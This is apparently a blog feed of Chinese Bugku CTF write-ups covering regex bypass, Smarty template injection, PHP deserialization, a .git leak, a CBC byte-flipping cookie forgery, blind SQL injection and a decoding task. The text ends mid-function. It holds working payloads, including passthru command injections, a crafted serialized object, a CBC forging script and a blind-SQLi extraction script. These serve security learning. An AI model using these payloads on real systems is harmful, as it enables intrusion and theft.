alt="regex1"></p><p>我现在就直接解释下当时构造payload的思路的：<br>seconde里要存在”/Yeedo|wants|a|girl|friend|or|a|flag/i”，而second=zero.first，所以zero=flag</p><p>key=second=zero.first，并且不能存在”/..|flag/“，也就是说zero不能=flag，但可以看下面highlight_file(base64_decode($zero).$end)，会进行base64_decode，所以直接将’flag’进行base64加密得到ZmxhZw==</p><p>之后third=first，并且要匹配”/\|\056\160\150\x70/i”，这是16进制与进制的东西，转换成10进制，再转成ascii码后即为|.php，但$end=substr($third,5);，故需要在|.php前面加上4个字符，来绕过substr，不过这4个字符得都是”/Yeedo|wants|a|girl|friend|or|a|flag/i”，这里面的（我这里给出一些字符:aaaa oror Flag girl ）这里用Flag的原因是不能匹配/..|flag/，所以完整的payload为：</p><pre><code>?zero=ZmxhZw==&amp;first=aaaa|.php</code></pre><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-聪明的PHP</title>
      <link href="2021/04/16/bugku-web-cong-ming-de-php/"/>
      <url>2021/04/16/bugku-web-cong-ming-de-php/</url>
      
        <content type="html"><![CDATA[<p>模板注入可以看这里：</p><p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP\1.png" alt="1"></p><p>传参试试：</p><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP\传参.png" alt="传参"></p><p>审计代码可以发现，这就是一个smarty模板注入</p><pre><code>{{2*2}}</code></pre><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP22.png" alt="22"></p><p>因为上传的时候会被过滤所以加了个“1”</p><p>看到执行了<br> 存在命令执行漏洞，过滤了不少函数，但看了一下，1passthru没有被过滤 这个函数可以代替system()</p><p>这时可以用1passthru相关的语句来构造payload：<br>我首先是先试了一下</p><pre><code>{{1passthru('tac /fl*')}}</code></pre><p>，发现没什么作用，接着试了</p><pre><code>{{1passthru('more /fl*')}}</code></pre><p>，同样没有效果，接着又试了</p><pre><code>{{1passthru('/?[a][t] /fl*')}}</code></pre><p>，还是不行，这时左想右想，突然想到题目的</p><pre><code>maybe the flag file’s filename is random</code></pre><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP\flag.png" alt="flag"></p><p>除了用more，还可以用less，head，tail，nl，vim</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-安慰奖</title>
      <link href="2021/04/15/bugku-web-an-wei-jiang/"/>
      <url>2021/04/15/bugku-web-an-wei-jiang/</url>
      
        <content type="html"><![CDATA[<p>源代码中发现<img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugku：Web-安慰奖\重命名.png" alt="重命名"></p><p>打开index.php.bak</p><pre><code>&lt;?phpheader("Content-Type: text/html;charset=utf-8");error_reporting(0);echo "&lt;!-- YmFja3Vwcw== --&gt;";class ctf{    protected $username = 'hack';    protected $cmd = 'NULL';    public function __construct($username,$cmd)    {        $this-&gt;username = $username;        $this-&gt;cmd = $cmd;    }    function __wakeup()    {        $this-&gt;username = 'guest';    }    function __destruct()    {        if(preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this-&gt;cmd))        {            exit('&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;');        }        if ($this-&gt;username === 'admin')        {           // echo "&lt;br&gt;right!&lt;br&gt;";            $a = `$this-&gt;cmd`;            var_dump($a);        }else        {            echo "&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;";            die();        }    }}    $select = $_GET['code'];    $res=unserialize(@$select);?&gt;</code></pre><p>序列化代码：</p><pre><code>&lt;?phpclass ctf{    protected $username = 'admin';    protected $cmd = 'tac flag.php';}$a=new ctf();echo(urlencode(serialize($a)));?&gt;</code></pre><p><img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugku：Web-安慰奖\tac.png" alt="tac"></p><p>protected属性被序列化的时候属性值会变成：%00*%00属性名<br> 而%00是空字符，在浏览器中会显示为空，但不代表传入时能没有%00，所以我们最后的payload应该加上%00</p><h4 id="绕过wake-up函数"><a href="#绕过wake-up函数" class="headerlink" title="绕过wake up函数"></a>绕过wake up函数</h4><pre><code>?code=O:3:%22ctf%22:3:{s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;}</code></pre><p><img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugku：Web-安慰奖\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web40-git泄露</title>
      <link href="2021/04/14/bugku-web40-git-xie-lu/"/>
      <url>2021/04/14/bugku-web40-git-xie-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="git信息泄露漏洞"><a href="#git信息泄露漏洞" class="headerlink" title="git信息泄露漏洞"></a>git信息泄露漏洞</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>攻击者可以利用该漏洞下载git文件夹里的所有内容。如果文件夹内有敏感信息比如站点源码、数据库账户密码等，攻击者可能直接控制服务器。</p><h3 id="Git介绍"><a href="#Git介绍" class="headerlink" title="Git介绍"></a>Git介绍</h3><p>Git作为大家熟悉的，深受欢迎的版本控制工具，和其他同类工具有很多不同之处：</p><ul><li>Git始终保存快照而不是文件差异。</li><li>任何数据存储前始终使用SHA-1计算校验和，保证内容完整性。</li><li>使用分布式仓库设计，让大多数操作都在本地进行，保证了使用效率。几乎所有操作都是向数据库增加数据，提交之后就很难丢失数据。它的本质更像一个内容寻址（content-addressable）文件系统，并在此之上提供了一个版本控制系统的用户界面。</li></ul><p>Git 有三种状态，你的文件可能处于其中之一：已修改（modified）、已暂存（staged）、已提交（committed）。由此引出三个逻辑区域，他们和文件状态以及部分对应操作的关系如下图。<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\git介绍.png" alt="git介绍"></p><p>Git对象<br>在Git系统中有四中类型的对象，所有的Git操作都是基于这四种类型的对象。</p><ul><li><p>“blob”，这种对象用来保存文件的内容。</p></li><li><p>“tree”，可以理解成一个对象关系树，它管理一些”tree”和“blob”对象。</p></li><li><p>“commit”，指向一个”tree”，它用来标记项目某一个特定时间点的状态。它包括以下关于时间点的元数据，如时间戳、最近一次提交的作者、指向上次提交、</p></li><li><p>“tag”，给某个提交增添一个标记。</p><p>git对象之间的个关系如下图</p><p><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\Git对象.png" alt="Git对象"></p></li></ul><h4 id="SHA1哈希值"><a href="#SHA1哈希值" class="headerlink" title="SHA1哈希值"></a>SHA1哈希值</h4><p>在Git系统中，每个Git对象都通过哈希值来代表这个对象。哈希值是通过SHA1算法计算出来的，长度为40个字符（40-digit）。</p><h4 id="git目录"><a href="#git目录" class="headerlink" title=".git目录"></a>.git目录</h4><ul><li>config - 包含一些配置选项</li><li>description - 仓库的描述信息，主要给gitweb等git托管系统使用</li><li>HEAD - 指定当前分支,映射到ref引用，能够找到下一次commit的前一次哈希值</li><li>hooks - 存放可在某些指令前后触发运行的钩子脚本（hook scripts），默认包含一些脚本样例</li><li>index - 这个文件就是我们前面提到的暂存区（stage），是一个二进制文件</li><li>info - 存放仓库的信息</li><li>objects - 存储所有Git的数据对象,对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名</li><li>refs - 存储各个分支指向的目标提交</li><li>branches - 还没发现有什么用处</li></ul><h3 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h3><p>对照这张图来理解两段提交，工作区(working tree)，暂存区（stage/index）和 branch之间的关系<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\git基本操作.png" alt="git基本操作"></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h3><ul><li><p>git ls-files -u显示冲突的文件，-s是显示标记为冲突已解决的文件</p></li><li><p>git diff 对比工作区和stage文件的差异</p></li><li><p>git diff –cached 对比stage和branch之间的差异</p></li><li><p>git ls-files –stage 检查保存在stage的文件</p></li><li><p>git log 显示到HEAD所指向的commit为止的所有commit记录 。</p></li><li><p>git reset HEAD <file></file></p></li><li><p>git reset –hard HEAD放弃工作区和index的改动,HEAD指针仍然指向当前的commit.</p><h3 id="实际操作流程"><a href="#实际操作流程" class="headerlink" title="实际操作流程"></a>实际操作流程</h3></li></ul><h4 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h4><p>此命令初始化一个新本地仓库，它在工作目录下数据目录生成一个名为.git的隐藏文件夹。git会将所有的文件，目录，提交等转化为git对象，压缩存储在这个文件夹当中。<br>git init 命令后面不加参数表示把当前目录变为仓库,如下表示在当前目录下创建test仓库<br>![git init](D:\blog\source_posts\Bugku：Web40-git泄露\git init.png)</p><h4 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h4><p>创建一个test1.txt文件，git status查看当前状态,此时test.txt文件位于工作目录<br>![git add](D:\blog\source_posts\Bugku：Web40-git泄露\git add.png)<br>通过git add跟踪这个文件,把test.txt文件放到暂存区.(可以使用git rm –cached命令来取消暂存)<br>![git rm –cached](D:\blog\source_posts\Bugku：Web40-git泄露\git rm –cached.png)</p><h4 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h4><p>在暂存区的文件使用git commit提交到版本库(数据目录)中<br>-m参数表示提交的注释,如果不使用-m参数那么会跳出页面提示主动输入注释<br>![git commit](D:\blog\source_posts\Bugku：Web40-git泄露\git commit.png)<br>修改test.txt文件<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\修改text文件.png" alt="修改text文件"></p><p>修改后，通过查看git status可以看到文件状态被改变了。根据提示知道文件已被修改，但是未提交修改到版本库中。<br>![git status](D:\blog\source_posts\Bugku：Web40-git泄露\git status.png)</p><p>git diff,对比工作区和暂存区文件的差异,查看文件被修改的地方<br>![git diff](D:\blog\source_posts\Bugku：Web40-git泄露\git diff.png)</p><p>确认修改无误后提交到版本库的方法和提交初始文件一样,需要先提交到暂存区,然后提交到版本库.<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\提交到版本库.png" alt="提交到版本库"><br>再修改一次文件<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\再修改一次文件.png" alt="再修改一次文件"></p><p>提交<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\提交.png" alt="提交"><br>git log 查看下历史记录,HEAD我的理解就是指针,指到最后提交的版本<br>![git log](D:\blog\source_posts\Bugku：Web40-git泄露\git log.png)<br>git reset –hard,回退版本<br>回退到上一个版本,gei reset –hard HEAD^<br>![git reset –hard](D:\blog\source_posts\Bugku：Web40-git泄露\git reset –hard.png)</p><p>厉害了,可以看到HEAD指针也指到了第一次修改的版本,第二次修改的版本看不到了<br>但是我要是因为操作失误怎么追回地二次修改的版本呢,可以使用git reset –hard 版本号追回<br>git reflog获取版本号,得到第二次修改版本号为5edcc89<br>![git reflog](D:\blog\source_posts\Bugku：Web40-git泄露\git reflog.png)</p><p>get reset –hard 5edcc89恢复<br>![get reset –hard 5edcc89](D:\blog\source_posts\Bugku：Web40-git泄露\get reset –hard 5edcc89.png)</p><p>我后面测试使用comit后面一串很长的字符,这里理解为对象sha1字符串吧.也可以回退到那个版本</p><p><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\回退到那个版本.png" alt="回退到那个版本"></p><p>可以把工作区修改的文件git add提交到暂存区，也可以使用git checkout — test1.txt 把工作区的修改撤销，这样，文件就会回退到上一次提交时的状态。<br>![git checkout — test1.txt](D:\blog\source_posts\Bugku：Web40-git泄露\git checkout — test1.txt.png)</p><h3 id="Git信息泄露原理"><a href="#Git信息泄露原理" class="headerlink" title="Git信息泄露原理"></a>Git信息泄露原理</h3><ul><li>通过泄露的.git文件夹下的文件，还原重建工程源代码</li><li>解析.git/index文件，找到工程中所有的（文件名，文件sha1）</li><li>去.git/objects文件夹下下载对应的文件</li><li>zlib解压文件，按原始的目录结构写入源代码<br>（危害：渗透测试人员、攻击者，可以进一步代码审计，挖掘：文件上传，sql注入等安全漏洞）</li></ul><h3 id="GitHack工具使用"><a href="#GitHack工具使用" class="headerlink" title="GitHack工具使用"></a>GitHack工具使用</h3><p>GitHack会按照上面的原理自动恢复<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\GitHack工具使用.png" alt="GitHack工具使用"></p><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><p>发现有/.git/目录，应该是git泄露了。</p><p>wget -r <a href="http://ip_address/.git">http://ip_address/.git</a>　　:递归下载该网站目录下的文件及文件夹</p><p>之后进入文件夹使用</p><p>git reflog:查看执行的命令日志</p><p><a href="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121170625249-528964650.png"><img src="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121170625249-528964650.png" alt="img"></a></p><p> 看到flag is here？那就只能一个一个试了，试了第二个的时候，找到了</p><p>使用git show commit_id 命令查看commit</p><p><a href="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121171515615-627590262.png"><img src="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121171515615-627590262.png" alt="img"></a></p><p>参考：<a href="https://www.cnblogs.com/tac2664/p/14309112.html">https://www.cnblogs.com/tac2664/p/14309112.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Misc-这是一张单纯的图片</title>
      <link href="2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/"/>
      <url>2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/</url>
      
        <content type="html"><![CDATA[<p>下载：</p><p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugku：Misc-这是一张单纯的图片\1.png" alt="1"></p><p>用记事本打开：</p><p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugku：Misc-这是一张单纯的图片\2.png" alt="2"></p><p>解码：</p><p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugku：Misc-这是一张单纯的图片\3.png" alt="3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web39-CBC字节翻转攻击</title>
      <link href="2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/"/>
      <url>2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="CBC字节翻转攻击的原理"><a href="#CBC字节翻转攻击的原理" class="headerlink" title="CBC字节翻转攻击的原理"></a>CBC字节翻转攻击的原理</h2><h5 id="CBC翻转攻击方法的精髓在于："><a href="#CBC翻转攻击方法的精髓在于：" class="headerlink" title="CBC翻转攻击方法的精髓在于："></a>CBC翻转攻击方法的精髓在于：</h5><p>通过损坏密文字节来改变明文字节。(注：借助CBC内部的模式)借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文)</p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\1.png" alt="1"></p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\2.png" alt="2"></p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\3.png" alt="3"></p><h5 id="CBC字节翻转攻击的原理："><a href="#CBC字节翻转攻击的原理：" class="headerlink" title="CBC字节翻转攻击的原理："></a>CBC字节翻转攻击的原理：</h5><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\CBC加密.png" alt="CBC加密"></p><ul><li>Plaintext:明文</li><li>Ciphertext:密文</li><li>Initialization Vector(IV):初始化向量-用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文</li><li>Block Cipher Encryption:分组密码加密</li></ul><ol><li>明文1 XOR 初始化向量(IV)=&gt;加密密文1=&gt;密文1</li><li>明文2 XOR 加密密文1=&gt;加密密文2=&gt;密文2</li><li>明文3 XOR 加密密文2=&gt;加密密文3=&gt;密文3</li></ol><h5 id="在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。"><a href="#在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。" class="headerlink" title="在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。"></a>在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。</h5><h5 id="整个加密的过程简单说来就是-共加密三次-："><a href="#整个加密的过程简单说来就是-共加密三次-：" class="headerlink" title="整个加密的过程简单说来就是(共加密三次)："></a>整个加密的过程简单说来就是(共加密三次)：</h5><ol><li>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</li><li>生成一个随机的初始化向量(IV)和一个密钥。</li><li>将IV和第一组明文异或。</li><li>用密钥对3中xor后产生的密文加密。</li><li>用4中产生的密文对第二组明文进行xor操作。</li><li>用密钥对5中产生的密文加密。</li><li>重复4-7，到最后一组明文。</li><li>将IV和加密后的密文拼接在一起，得到最终的密文。</li></ol><p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：前一块的密文用来产生后一块的密文。</p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\CBC解密.png" alt="CBC解密"></p><ul><li>Decryption:解密</li></ul><h5 id="CBC解密的重点在于-前一段密文参与下一段密文的还原"><a href="#CBC解密的重点在于-前一段密文参与下一段密文的还原" class="headerlink" title="CBC解密的重点在于:前一段密文参与下一段密文的还原:"></a>CBC解密的重点在于:前一段密文参与下一段密文的还原:</h5><ol><li>从密文中提取出IV，然后将密文分组。</li><li>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</li><li>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</li><li>重复2-3，直到最后一组密文。</li></ol><h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\CBC攻击.png" alt="CBC攻击"></p><ul><li>Flipped ciphertext bits:翻转密文位</li><li>Garbled decryption:乱码解密</li><li>Flipped plaintext bits:翻转明文位</li></ul><ol><li>密文1=&gt;解密密文1=&gt;解密密文1 XOR 初始化向量(iv) = 明文1</li><li>密文2=&gt;解密密文2=&gt;解密密文2 XOR 密文1 = 明文2</li><li>密文3=&gt;解密密文3=&gt;解密密文3 XOR 密文2 = 明文3</li></ol><p>我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器</p><blockquote><p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p></blockquote><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">A⊕B⊕C</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0</td><td align="center">1</td><td align="center">0</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">0</td></tr><tr><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr></tbody></table><h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><p>御剑扫描后台发现.index.php.swp</p><p>由于windows打不开文件所以采用网上的了:</p><pre><code>&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv(){    //随机生成16位初始化向量    $random_iv='';    for($i=0;$i&lt;16;$i++){        $random_iv.=chr(rand(1,255));    }    return $random_iv;}#第一个执行的方法function login($info){    $iv = get_random_iv();    $plain = serialize($info);    //明文序列化    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    //加密    //options：以下标记的按位或： OPENSSL_RAW_DATA 原生数据，对应数字1，不进行 base64 编码。OPENSSL_ZERO_PADDING 数据进行 base64 编码再返回，对应数字0。     $_SESSION['username'] = $info['username'];    //注册SESSION全局变量    //以下两行设置cookie    setcookie("iv", base64_encode($iv));    setcookie("cipher", base64_encode($cipher));}function check_login(){    if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){        $cipher = base64_decode($_COOKIE['cipher']);        $iv = base64_decode($_COOKIE["iv"]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;");            $_SESSION['username'] = $info['username'];        }else{            die("ERROR!");        }    }}#第二个执行，检测用户名为admin时，打印flagfunction show_homepage(){    if ($_SESSION["username"]==='admin'){        echo '&lt;p&gt;Hello admin&lt;/p&gt;';        echo '&lt;p&gt;Flag is $flag&lt;/p&gt;';    }else{        echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;';        echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;';    }    echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';}if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){    $username = (string)$_POST['username'];    $password = (string)$_POST['password'];    if($username === 'admin'){        exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;');    }else{        $info = array('username'=&gt;$username,'password'=&gt;$password);        login($info);        show_homepage();    }}else{    if(isset($_SESSION["username"])){        check_login();        show_homepage();    }else{        echo '&lt;body class="login-body"&gt;                &lt;div id="wrapper"&gt;                    &lt;div class="user-icon"&gt;&lt;/div&gt;                    &lt;div class="pass-icon"&gt;&lt;/div&gt;                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;                        &lt;div class="header"&gt;                        &lt;h1&gt;Login Form&lt;/h1&gt;                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;                        &lt;/div&gt;                        &lt;div class="content"&gt;                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;                        &lt;/div&gt;</code></pre><p>POST参数(username,password)，并且禁止admin登陆。当用户名不是admin的时候，首先把用户名密码放入数组，传到login方法中。<br>login方法对传入的数组进行了序列化，并且使用aes-128-cbc对序列化进行加密。iv(初始化向量)是随机生成的。最终把cipher和iv放入cookie。<br>再到show_homepage()方法，检测$<em>SESSION中的username是admin时，打印flag。否则提示Only admin can see flag</em></p><p>然后审计else的下半部分，这里是上半部分操作执行过后，存在$_SESSION[‘username’]时执行。当不存在POST数据或者$_SESSION[‘username’]时，显示登陆页面。<br>有$_SESSION[‘username’]时，进入check_login()方法。<br>当cookie中存在cipher、iv时，对cipher进行解密。这里是解题的关键，可以通过修改cookie中的cipher值，将序列化数据的用户名修改成admin。从而绕过程序起点处禁止admin登陆的判断。</p><h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><ol><li>send to repeater以后go</li><li>删除post内容</li><li>将cipher的值代入程序</li></ol><pre><code>&lt;?phpheader("Content-Type: text/html;charset=utf-8");    $cipher = base64_decode(urldecode('1bwcTEFquw2kLy3UGhW3OOw%2Bkof9%2BjH2XhiKvkVuzqmndIOd9fBXLB82Q3hbM7LCx8ySoty36X8pOIOylkSkkg%3D%3D'));    $temp = $cipher;    $cipher[13] = chr(ord($cipher[13]) ^ ord('l') ^ ord('n'));    echo urlencode(base64_encode($cipher));    ?&gt;</code></pre><ol start="4"><li><p>替换cookies里的cipher</p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\base64解码.png" alt="base64解码"></p><p>base64解码以后可以看到admil已经替换成admin</p></li><li><p>回显base64和iv代入程序</p></li></ol><pre><code>&lt;?php    $res = base64_decode('xaJllZwcE1Rh7Z0ieT8WV21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==');    //这里放burp放回的base64数据    $iv = base64_decode(urldecode('FIbK%2FCXr43MhcD7KRPnlaA%3D%3D'));     $plaintext = 'a:2:{s:8:"userna';    $new_iv = '';    for ($i = 0; $i &lt; 16; $i ++){        $new_iv = $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i]));    }    echo urlencode(base64_encode($new_iv));?&gt;</code></pre><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\localhost2.php.png" alt="localhost2.php"></p><ol start="6"><li>用输出iv的值替换cookies里的iv</li></ol><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web36-各种过滤</title>
      <link href="2021/04/11/bugku-web36-ge-chong-guo-lu/"/>
      <url>2021/04/11/bugku-web36-ge-chong-guo-lu/</url>
      
        <content type="html"><![CDATA[<pre><code># -*- coding: utf-8 -*-import requestssession = requests.Session()url="http://114.67.246.176:12012/login.php"flag=''for i in range(1,250):        left=32        right=128        mid=(left+right)//2        while(left&lt;right):                payload="admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))&gt;%s))^'1"%(i,mid)                data = {'uname': payload, 'passwd': 'admin'}                res = requests.post(url, data=data)                if 'password' in res.text:                        left=mid+1                else:                        right=mid                mid=(left+right)//2        if(mid==32 or mid==127):                break        flag=flag+chr(mid)        print(flag)</code></pre><p>猜测是md5，去解码得到<code>bugkuctf</code></p><pre><code>cat&lt;/flag</code></pre><pre><code>{cat,/flag}</code></pre><p><img src="/2021/04/11/bugku-web36-ge-chong-guo-lu/blog/source_posts\Bugku：Web36-各种过滤\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web33-解码</title>
      <link href="2021/04/09/bugku-web33-jie-ma/"/>
      <url>2021/04/09/bugku-web33-jie-ma/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?phpfunction encrypt($data,$key){    $key = md5('ISCC'); #729623334f0aa2784a1599fd374c120d    $x = 0;    $len = strlen($data);    $klen = strlen($key);    for ($i=0; $i &lt; $len; $i++) {         if ($x == $klen)        {            $x = 0;        }        $char .= $key[$x];        $x+=1;    }    for ($i=0; $i &lt; $len; $i++) {        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);    }    return base64_encode($str);}?&gt;</code></pre><pre><code>描　　述: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</code></pre><p>需要对描述字符串解密，解密函数如下</p><pre><code>&lt;?phpfunction decrypt($str) {    $mkey = "729623334f0aa2784a1599fd374c120d";    $klen = strlen($mkey);    $tmp = $str;    $tmp = base64_decode($tmp);  // 对 base64 后的字符串 decode    $md_len = strlen($tmp); //获取字符串长度    $x = 0;    $char = "";    for($i=0;$i &lt; $md_len;$i++) {  //  取二次加密用 key;        if ($x == $klen)  // 数据长度是否超过 key 长度检测            $x = 0;        $char .= $mkey[$x];  // 从 key 中取二次加密用 key        $x+=1;    }    $md_data = array();    for($i=0;$i&lt;$md_len;$i++) { // 取偏移后密文数据        array_push($md_data, ord($tmp[$i]));    }    $md_data_source = array();    $data1 = "";    $data2 = "";    foreach ($md_data as $key =&gt; $value) { // 对偏移后的密文数据进行还原        $i = $key;        if($i &gt;= strlen($mkey)) {$i = $i - 